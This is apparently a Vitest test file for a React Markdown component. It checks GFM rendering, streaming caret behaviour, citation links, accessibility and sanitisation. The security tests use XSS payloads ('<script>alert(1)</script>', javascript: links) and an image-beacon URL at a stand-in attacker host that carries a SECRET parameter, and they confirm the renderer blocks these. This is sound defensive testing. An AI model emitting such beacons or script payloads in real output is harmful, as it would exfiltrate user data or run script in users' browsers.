import { cleanup, render, screen } from '@testing-library/react';
import { describe, expect, it, vi } from 'vitest';
import { Markdown, type MarkdownProps } from '../src/markdown';
import { axe } from './utils';

describe('Markdown', () => {
  it('renders GFM: headings, lists, tables, inline and block code', () => {
    const { container } = render(
      <Markdown>
        {'## Plan\n\n- one\n- two\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\nUse `ratelimit`.\n\n```ts\nconst x = 1;\n```'}
      </Markdown>,
    );
    expect(screen.getByRole('heading', { level: 2, name: 'Plan' })).toBeInTheDocument();
    expect(screen.getAllByRole('listitem')).toHaveLength(2);
    expect(screen.getByRole('table')).toBeInTheDocument();
    expect(screen.getByText('ratelimit').tagName).toBe('CODE');
    expect(container.querySelector('pre')).toHaveTextContent('const x = 1;');
    expect(screen.getByRole('button', { name: 'Copy code' })).toBeInTheDocument();
  });

  it('closes unterminated syntax while streaming and shows a caret', () => {
    const { container } = render(<Markdown streaming>{'This is **important'}</Markdown>);
    expect(container.querySelector('strong')).toHaveTextContent('important');
    expect(container.querySelector('[class*="animate-aui-blink"]')).not.toBeNull();
    expect(container).not.toHaveTextContent('**');
  });

  it('does not render raw HTML or javascript: URLs', () => {
    const { container } = render(
      <Markdown>{'<script>alert(1)</script>\n\nInline <b>x</b> and [click](javascript:alert(1))'}</Markdown>,
    );
    expect(container.querySelector('script')).toBeNull();
    expect(container.querySelector('b')).toBeNull();
    expect(screen.getByText('click').closest('a')?.getAttribute('href') ?? '').not.toContain('javascript');
  });

  it('opens external links in a new tab', () => {
    render(<Markdown>{'[docs](https://ai-sdk.dev)'}</Markdown>);
    expect(screen.getByRole('link', { name: 'docs' })).toHaveAttribute('target', '_blank');
  });

  it('turns [n] markers into citation links, but not inside code', () => {
    const { container } = render(
      <Markdown citations={2} citationPrefix="m1-source">
        {'Sliding windows work well [1][2]. Arrays use `a[1]`. Out of range [3].'}
      </Markdown>,
    );
    expect(screen.getByRole('link', { name: 'Source 1' })).toHaveAttribute('href', '#m1-source-1');
    expect(screen.getByRole('link', { name: 'Source 2' })).toHaveAttribute('href', '#m1-source-2');
    expect(screen.queryByRole('link', { name: 'Source 3' })).not.toBeInTheDocument();
    expect(container.querySelector('code')).toHaveTextContent('a[1]');
  });

  describe('streaming caret', () => {
    /** Render while capturing React's console errors (invalid DOM nesting, void-element children). */
    function renderStreaming(text: string, props: Partial<MarkdownProps> = {}) {
      const errors: string[] = [];
      const spy = vi.spyOn(console, 'error').mockImplementation((...args) => errors.push(args.map(String).join(' ')));
      try {
        const { container } = render(
          <Markdown streaming {...props}>
            {text}
          </Markdown>,
        );
        return { container, errors };
      } finally {
        spy.mockRestore();
      }
    }

    it.each([
      ['a dashed thematic break', 'Done.\n\n---\n', 'hr'],
      ['a starred thematic break', 'Section one\n\n***', 'hr'],
    ])('puts the caret after %s instead of inside it', (_name, text, tag) => {
      const { container, errors } = renderStreaming(text);
      expect(errors).toEqual([]);
      const el = container.querySelector(tag)!;
      expect(el.childNodes).toHaveLength(0);
      expect(el.nextElementSibling).toHaveAttribute('aria-hidden', 'true');
      expect(container.querySelector('[class*="animate-aui-blink"]')).not.toBeNull();
    });

    it('keeps the caret out of a trailing image', () => {
      const { container, errors } = renderStreaming('See ![x](https://img.test/chart.png)', {
        allowedImageHosts: ['img.test'],
      });
      expect(errors).toEqual([]);
      const img = container.querySelector('img')!;
      expect(img.childNodes).toHaveLength(0);
      expect(img.nextElementSibling).toHaveAttribute('aria-hidden', 'true');
    });

    it('renders every prefix of a rich document without errors', () => {
      const doc = [
        '# Plan\n\nRead **the route** and `lib/redis.ts`, then [docs](https://ai-sdk.dev).\n\n',
        '- [x] search\n- [ ] read\n\n1. one\n2. two\n\n',
        '> quoted *text*\n\n---\n\n',
        '![chart](https://img.test/c.png) and a break  \nnext line\n\n',
        '| a | b |\n|---|---|\n| 1 | 2 |\n\n',
        '```ts\nconst x = 1;\n```\n\n***\n',
      ].join('');
      for (const allowedImageHosts of [undefined, ['img.test']]) {
        for (let end = 1; end <= doc.length; end++) {
          const { errors } = renderStreaming(doc.slice(0, end), { allowedImageHosts });
          expect({ prefix: doc.slice(0, end), errors }).toEqual({ prefix: doc.slice(0, end), errors: [] });
          cleanup();
        }
      }
    });
  });

  describe('images', () => {
    const pixel = 'https://attacker.example/pixel.png?d=SECRET';

    it('does not load remote images by default, and links to them instead', () => {
      const { container } = render(<Markdown>{`Summary ![status](${pixel}) done.`}</Markdown>);
      expect(container.querySelector('img')).toBeNull();
      const link = screen.getByRole('link', { name: /status/ });
      expect(link).toHaveAttribute('href', pixel);
      expect(link).toHaveAttribute('rel', 'noopener noreferrer');
    });

    it('loads images only from allowed hosts', () => {
      const { container } = render(
        <Markdown allowedImageHosts={['Images.Example.com', 'localhost:3000']}>
          {[
            '![ok](https://images.example.com/a.png)',
            `![pixel](${pixel})`,
            '![lookalike](https://images.example.com.attacker.example/a.png)',
            '![relative](/a.png)',
            '![protocol-relative](//attacker.example/a.png)',
            '![port](http://localhost:3000/a.png)',
          ].join('\n\n')}
        </Markdown>,
      );
      expect([...container.querySelectorAll('img')].map((img) => img.getAttribute('src'))).toEqual([
        'https://images.example.com/a.png',
        'http://localhost:3000/a.png',
      ]);
      expect(screen.getByRole('img', { name: 'ok' })).toBeInTheDocument();
      expect(screen.getAllByRole('link')).toHaveLength(4);
    });

    it("loads every image with '*'", () => {
      const { container } = render(<Markdown allowedImageHosts={['*']}>{`![a](${pixel}) ![b](/b.png)`}</Markdown>);
      expect(container.querySelectorAll('img')).toHaveLength(2);
    });

    it('renders the alt text for images without a usable URL, including half-streamed ones', () => {
      const errors = vi.spyOn(console, 'error').mockImplementation(() => {});
      const { container, rerender } = render(
        <Markdown allowedImageHosts={['*']}>{'![x](javascript:alert(1)) ![y](data:image/png;base64,AAAA)'}</Markdown>,
      );
      expect(container.querySelector('img')).toBeNull();
      expect(container).toHaveTextContent('x y');
      rerender(
        <Markdown streaming allowedImageHosts={['*']}>
          {'Here: ![chart](https://img.te'}
        </Markdown>,
      );
      expect(container.querySelector('img')).toBeNull();
      expect(container).toHaveTextContent('Here: chart');
      expect(errors).not.toHaveBeenCalled();
      errors.mockRestore();
    });
  });

  it('has no axe violations', async () => {
    const { container } = render(
      <Markdown citations={1} allowedImageHosts={['img.test']}>
        {
          '# Title\n\nText [1] with [a link](https://x.dev).\n\n```sh\npnpm i\n```\n\n![chart](https://img.test/c.png) ![pixel](https://x.dev/p.png)'
        }
      </Markdown>,
    );
    expect(await axe(container)).toHaveNoViolations();
  });
});
